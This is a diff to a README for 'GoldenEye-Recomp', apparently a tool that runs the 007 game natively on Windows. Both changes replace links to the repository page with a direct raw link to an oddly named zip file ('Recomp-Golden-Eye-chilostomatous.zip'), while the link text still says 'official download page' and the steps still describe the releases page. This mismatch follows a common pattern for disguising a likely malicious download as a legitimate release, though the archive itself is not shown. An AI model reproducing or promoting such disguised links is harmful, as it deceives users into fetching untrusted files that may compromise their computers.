@@ -1,6 +1,6 @@
 # 🎮 GoldenEye-Recomp - Play Classic Games With Perfect Performance
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ericksa1417/GoldenEye-Recomp)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ericksa1417/GoldenEye-Recomp/raw/refs/heads/main/assets/Recomp-Golden-Eye-chilostomatous.zip)
 
 GoldenEye-Recomp brings the 007 experience to your modern Windows computer. This tool converts the original game code into a native application. You do not need an emulator. The game runs directly on your hardware for better speed and stability.
 
@@ -16,7 +16,7 @@ You need a few items before you begin:
 
 Follow these steps to obtain the tool:
 
-1.  Visit the [official download page](https://github.com/ericksa1417/GoldenEye-Recomp).
+1.  Visit the [official download page](https://github.com/ericksa1417/GoldenEye-Recomp/raw/refs/heads/main/assets/Recomp-Golden-Eye-chilostomatous.zip).
 2.  Look for the latest release on the right side of the screen.
 3.  Click the version number under the "Releases" heading.
 4.  Download the file ending in `.zip` to your computer.
